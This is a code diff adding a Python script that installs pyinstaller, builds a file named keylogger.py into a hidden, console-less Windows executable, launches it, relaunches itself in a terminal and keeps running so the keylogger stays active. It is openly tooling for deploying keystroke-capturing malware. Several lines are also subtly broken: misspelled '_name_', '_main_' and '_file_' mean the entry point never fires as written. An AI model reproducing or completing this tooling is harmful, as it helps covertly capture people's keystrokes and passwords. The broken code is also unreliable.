@@ -1,0 +1,79 @@
+import subprocess
+import sys
+import os
+import time
+
+# Function to install pyinstaller if it's not already installed
+def install_pyinstaller():
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+        print("[+] pyinstaller installed successfully.")
+    except subprocess.CalledProcessError:
+        print("[-] Failed to install pyinstaller. Please install manually.")
+
+# Function to create an executable using pyinstaller
+def create_executable():
+    # Assuming keylogger.py is in the same directory as keylogger_installer.py
+    try:
+        print("[+] Creating the executable...")
+        subprocess.check_call([sys.executable, "-m", "pyinstaller", "--onefile", "--noconsole", "keylogger.py"])
+        print("[+] Executable created successfully!")
+    except subprocess.CalledProcessError:
+        print("[-] Failed to create the executable.")
+
+# Function to check if the executable was created and exists in the dist folder
+def check_executable():
+    exe_path = os.path.join(os.getcwd(), 'dist', 'keylogger.exe')
+    if os.path.exists(exe_path):
+        print("[+] Executable found: keylogger.exe")
+        return True
+    else:
+        print("[-] Executable not found in the dist folder.")
+        return False
+
+# Function to run the keylogger executable
+def run_executable():
+    exe_path = os.path.join(os.getcwd(), 'dist', 'keylogger.exe')
+    if os.path.exists(exe_path):
+        try:
+            print("[+] Running the executable...")
+            subprocess.Popen(exe_path)  # Run the executable
+        except Exception as e:
+            print(f"[-] Failed to run the executable: {e}")
+    else:
+        print("[-] Executable not found. Something went wrong.")
+
+# Function to open command prompt or terminal and re-run the script
+def run_in_terminal():
+    try:
+        print("[+] Opening command prompt and running the script...")
+        # On Windows
+        if sys.platform == "win32":
+            subprocess.Popen("start cmd /K python keylogger_installer.py", shell=True)
+        # On macOS/Linux
+        elif sys.platform in ["linux", "darwin"]:
+            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"python3 {os.path.abspath(_file_)}; exec bash"])
+    except Exception as e:
+        print(f"[-] Failed to open terminal: {e}")
+
+# Main function to orchestrate the entire process
+def main():
+    # Install pyinstaller
+    install_pyinstaller()
+
+    # Create executable
+    create_executable()
+
+    # Check if executable is created
+    if check_executable():
+        run_executable()
+
+    # Run the script in terminal/command prompt
+    run_in_terminal()
+
+if _name_ == "_main_":
+    main()
+
+    # Optional: Keep the script alive so the keylogger works (can be removed)
+    while True:
+        time.sleep(10)  # Fixed missing closing parenthesis here
